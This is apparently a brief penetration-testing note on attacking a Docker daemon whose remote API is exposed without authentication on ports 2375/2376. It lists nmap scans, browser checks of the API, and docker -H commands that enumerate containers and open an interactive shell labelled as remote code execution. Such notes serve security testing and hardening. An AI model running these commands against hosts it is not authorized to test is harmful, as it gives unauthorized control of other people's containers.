# Docker API unauthorized RCE
- Docker is an open-source platform for developers and other IT professionals to help build, ship, and run distributed applications.
the docker daemon (dockerd) provides an API service used for remote control of docker service the default daemon listen on Unix /var/run/docker.sock and when bound to a public interface can be used by an attacker to compromise container system due to lack of default authentication

## Background concept:

- The host is running docker: daemon bound to the external interface with no access control or authentication
- Attacker uses docker API function to enumerate manage and control the container service the attacker is able to control existing deployed container or create another one.
- Docker API provides JSON response containing the output of command issued.
- Enumerating docker API services
- By default, the Docker host remote API listens on ports 2375 / 2376 and has no authentication. If the port is not blocked, docker host APIs can be accessed over the public internet.

```
nmap IP:2375/2376
nmap -p- IP
nmap -Pn -p 2375 IP
nmap -sV -p 2375 IP
```
- To confirm that the docker is service is running on the target we can give the string in the browser and check the response
ex: `https://IP:2375`
- we will receive a response something like this
`{"message":"page not found"}`
- and to confirm the version details we can use this
`https://IP:2375/version`

- The command used to exploit

- This command is used to get all the information about the docker container
`docker -H IP:2375 info`

- List all the running containers
`docker -H IP:2375 ps`

- List all the stopped containers
`docker -H IP:2375 ps -a`

- Docker command for RCE
`docker -H IP:2375 exec -it container_name /bin/bash`
